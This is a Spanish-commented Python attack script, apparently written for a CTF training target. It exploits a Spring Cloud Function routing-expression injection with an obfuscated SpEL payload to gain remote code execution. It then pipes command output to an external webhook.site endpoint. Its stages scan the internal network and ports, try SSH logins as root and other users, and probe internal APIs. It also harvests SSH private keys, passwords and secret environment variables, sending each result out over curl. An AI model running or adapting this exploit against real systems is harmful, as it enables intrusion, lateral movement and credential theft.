#!/usr/bin/env python3
"""
CTF Chile - Infiltración profunda en servicios internos
Script especializado para el pivot a la red interna
"""
import requests
import time
import sys

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🕳️ INFILTRACIÓN PROFUNDA - SERVICIOS INTERNOS")
print("=" * 50)

# Crear webhook
print("[1/6] Preparando canal de exfiltración...")
try:
    r = requests.post("https://webhook.site/token", timeout=10)
    UUID = r.json()["uuid"]
    WH = f"https://webhook.site/{UUID}"
    print(f"    ✓ Webhook: https://webhook.site/#!/{UUID}")
except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)

def execute_rce(cmd, desc=""):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        if desc:
            print(f"    ✓ {desc}")
        return True
    except:
        if desc:
            print(f"    ✗ {desc}")
        return False

print("\n[2/6] Mapeando red interna...")
# Escaneo de red más exhaustivo
network_commands = [
    ("ip a; ip r; cat /etc/hosts", "Configuración de red"),
    ("arp -a 2>/dev/null || cat /proc/net/arp", "Tabla ARP"),
    ("nmap -sn 10.160.209.0/24 2>/dev/null || ping -c1 10.160.209.{1..10}", "Escaneo de hosts"),
]

for cmd, desc in network_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/network_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[3/6] Escaneando servicios...")
# Escaneo de puertos más agresivo
hosts = ["10.160.209.1", "10.160.209.2", "127.0.0.1", "localhost"]
common_ports = ["22", "23", "80", "443", "3000", "5000", "8000", "8080", "8443", "9000"]

for host in hosts:
    for port in common_ports:
        cmd = f"timeout 3 bash -c 'echo >/dev/tcp/{host}/{port}' 2>/dev/null && echo '{host}:{port} OPEN' | curl -s -X POST --data-binary @- {WH}/scan_{host}_{port}"
        execute_rce(cmd, f"Escaneando {host}:{port}")
        time.sleep(0.2)

print("\n[4/6] Explorando servicios SSH...")
# Intentar técnicas de SSH
ssh_commands = [
    ("ssh-keyscan 10.160.209.1 2>/dev/null", "SSH banner"),
    ("ssh -o ConnectTimeout=5 -o BatchMode=yes root@10.160.209.1 'echo success' 2>&1", "SSH como root"),
    ("ssh -o ConnectTimeout=5 -o BatchMode=yes admin@10.160.209.1 'echo success' 2>&1", "SSH como admin"),
    ("ssh -o ConnectTimeout=5 -o BatchMode=yes ubuntu@10.160.209.1 'echo success' 2>&1", "SSH como ubuntu"),
]

for cmd, desc in ssh_commands:
    full_cmd = f"{cmd} | curl -s -X POST --data-binary @- {WH}/ssh_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[5/6] Explorando APIs internas...")
# APIs específicas de OmniVault y otros servicios
api_endpoints = [
    ("10.160.209.1:8080", ["/", "/api", "/api/status", "/api/config", "/admin", "/vault"]),
    ("10.160.209.2:8080", ["/", "/api", "/api/status", "/api/config", "/admin", "/vault"]),
    ("10.160.209.1:3000", ["/", "/api", "/admin", "/config"]),
    ("10.160.209.2:3000", ["/", "/api", "/admin", "/config"]),
    ("10.160.209.1:80", ["/", "/index.html", "/admin", "/config"]),
]

for host_port, endpoints in api_endpoints:
    for endpoint in endpoints:
        cmd = f"curl -s --connect-timeout 3 http://{host_port}{endpoint} | head -100 | curl -s -X POST --data-binary @- {WH}/api_{host_port.replace(':', '_')}{endpoint.replace('/', '_')}"
        execute_rce(cmd, f"API {host_port}{endpoint}")
        time.sleep(0.5)

print("\n[6/6] Buscando credenciales para pivot...")
# Búsqueda específica de credenciales para acceso lateral
cred_commands = [
    ("find /home -name '.ssh' 2>/dev/null | xargs ls -la", "Claves SSH"),
    ("cat /root/.ssh/* 2>/dev/null", "Claves SSH root"),
    ("find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null | xargs cat", "Claves privadas"),
    ("grep -r 'password' /app/ 2>/dev/null | head -20", "Passwords en app"),
    ("env | grep -iE '(password|key|secret|token|auth)'", "Variables secretas"),
    ("cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE '(password|secret|key)' | head -20", "Secretos en procesos"),
]

for cmd, desc in cred_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/creds_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n⏳ Esperando resultados (20s)...")
time.sleep(20)

print("\n" + "="*60)
print("📊 ANÁLISIS COMPLETADO")
print("="*60)
print(f"🔗 Webhook: https://webhook.site/#!/{UUID}")
print("")
print("🎯 BUSCAR ESPECÍFICAMENTE:")
print("   • Servicios que responden (no Connection refused)")
print("   • APIs que devuelven JSON válido")
print("   • Credenciales SSH o tokens")
print("   • Mensajes de error que revelen información")
print("   • Flags en respuestas de servicios internos")
print("")
print("🚀 PRÓXIMOS PASOS:")
print("   1. Identifica servicios activos")
print("   2. Busca credenciales válidas")
print("   3. Accede al segundo host")
print("   4. Repite el proceso de búsqueda de flags")
print("="*60)